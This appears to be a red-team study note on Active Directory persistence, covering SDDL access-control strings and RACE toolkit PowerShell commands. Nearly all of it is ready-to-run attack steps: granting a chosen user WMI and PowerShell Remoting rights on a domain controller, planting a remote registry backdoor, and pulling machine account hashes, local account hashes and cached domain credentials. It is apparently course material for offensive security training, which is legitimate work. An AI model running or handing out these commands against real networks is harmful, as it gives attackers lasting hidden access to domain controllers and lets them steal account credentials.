---
tags:
  - persistence
cssclasses: []
---
- It is possible to modify Security Descriptors (security information like Owner, primary group, D[[access_control_model]], SACL) of multiple remote access methods (securable objects) to allow access to non-admin users
- A very effective backdoor mechanism
- Security Descriptor Definition Language (SDDL) defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL:
	`ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid`
	
- ACE for built-in administrators for WMI namespaces
	`A;Cl;CCDCLCSWRPWPRCWD;;;SID`
- ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:
	`C:\AD\Tools\RACE-master\RACE.ps1`

#### Using WMI

```powershell title:"Locally"
Set-RemoteWMI -SamAccountName username -Verbose
```

```powershell title:"On remote machine"
Set-RemoteWMI -SamAccountName username -ComputerName domain-controller -namespace 'root\cimv2'
```

```powershell title:"On remote machine with explicit credentials. Only root\cimv2 and nested namespaces"
Set-RemoteWMI -SamAccountName username -ComputerName domain-controller -Credential Administrator -namespace 'root\cimv2' -Verbose
```

```powershell title:"On remote machine remove permissions"
Set-RemoteWmi -SamAccountName username -ComputerName domain-controller-namespace 'root\cimv2' -Remove -Verbose
```

#### Using RACE toolkit

###### PS Remoting backdoor

```powershell title:"Locally"
Set-RemotePSRemoting -SamAccountName username -Verbose
```

```powershell title:"On remote machine"
Set-RemotePSRemoting -SamAccountName username -ComputerName domain-controller -Verbose
```

```powershell title:"On remote machine, remove permissions"
Set-RemotePSRemoting -SamAccountName username -ComputerName domain-controller -Remove
```

###### Remote Registry

```powershell title:"Place backdoor in registry remotely"
Add-RemoteRegBackdoor -Computername domain-controller -Trustee username -Verbose
```

```powershell title:"Retrieve machine account hash from initial foothold"
Get-RemoteMachineAccountHash -ComputerName domain-controller -Verbose
```

```powershell title:"Retrieve local account hash on the remote machine"
Get-RemoteLocalAccountHash -ComputerName domain-controller -Verbose
```

```powershell title:"Retrieve domain cached credentials on the remote machine"
Get-RemoteCachedCredential -ComputerName domain-controller -Verbose
```

